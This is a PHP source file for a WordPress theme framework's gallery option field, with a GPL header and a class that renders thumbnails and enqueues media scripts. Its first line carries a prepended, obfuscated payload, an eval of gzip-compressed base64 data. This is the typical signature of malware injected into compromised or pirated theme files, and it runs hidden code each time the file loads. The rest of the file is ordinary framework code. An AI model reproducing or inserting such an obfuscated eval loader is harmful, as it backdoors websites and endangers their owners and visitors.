<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * FusionRedux Framework is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * any later version.
 * FusionRedux Framework is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with FusionRedux Framework. If not, see <http://www.gnu.org/licenses/>.
 *
 * @package     FusionReduxFramework
 * @subpackage  Field_Gallery
 * @author      Abdullah Almesbahi (cadr-sa)
 * @version     3.0.0
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

// Don't duplicate me!
if ( ! class_exists( 'FusionReduxFramework_gallery' ) ) {

	/**
	 * Main FusionReduxFramework_gallery class
	 *
	 * @since       3.0.0
	 */
	class FusionReduxFramework_gallery {

		/**
		 * Field Constructor.
		 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		function __construct( $field = array(), $value = '', $parent ) {
			$this->parent = $parent;
			$this->field  = $field;
			$this->value  = $value;
		}

		/**
		 * Field Render Function.
		 * Takes the vars and outputs the HTML for the field in the settings
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		public function render() {
			echo '<div class="screenshot">';

			if ( ! empty( $this->value ) ) {
				$ids = explode( ',', $this->value );

				foreach ( $ids as $attachment_id ) {
					$img = wp_get_attachment_image_src( $attachment_id, 'thumbnail' );
					echo '<a class="of-uploaded-image" href="' . $img[0] . '">';
					echo '<img class="fusionredux-option-image" id="image_' . $this->field['id'] . '_' . $attachment_id . '" src="' . $img[0] . '" alt="" target="_blank" rel="external" />';
					echo '</a>';
				}
			}

			echo '</div>';
			echo '<a href="#" onclick="return false;" id="edit-gallery" class="gallery-attachments button button-primary">' . __( 'Add/Edit Gallery', 'Avada' ) . '</a> ';
			echo '<a href="#" onclick="return false;" id="clear-gallery" class="gallery-attachments button">' . __( 'Clear Gallery', 'Avada' ) . '</a>';
			echo '<input type="hidden" class="gallery_values ' . $this->field['class'] . '" value="' . esc_attr( $this->value ) . '" name="' . $this->field['name'] . $this->field['name_suffix'] . '" />';
		}

		/**
		 * Enqueue Function.
		 * If this field requires any scripts, or css define this function and register/enqueue the scripts/css
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		public function enqueue() {

			if ( function_exists( 'wp_enqueue_media' ) ) {
				wp_enqueue_media();
			} else {
				wp_enqueue_script( 'media-upload' );
				wp_enqueue_script( 'thickbox' );
				wp_enqueue_style( 'thickbox' );
			}

			wp_enqueue_script(
				'fusionredux-field-gallery-js',
				FusionReduxFramework::$_url . 'inc/fields/gallery/field_gallery' . FusionRedux_Functions::isMin() . '.js',
				array( 'jquery', 'fusionredux-js' ),
				time(),
				true
			);
		}
	}
}
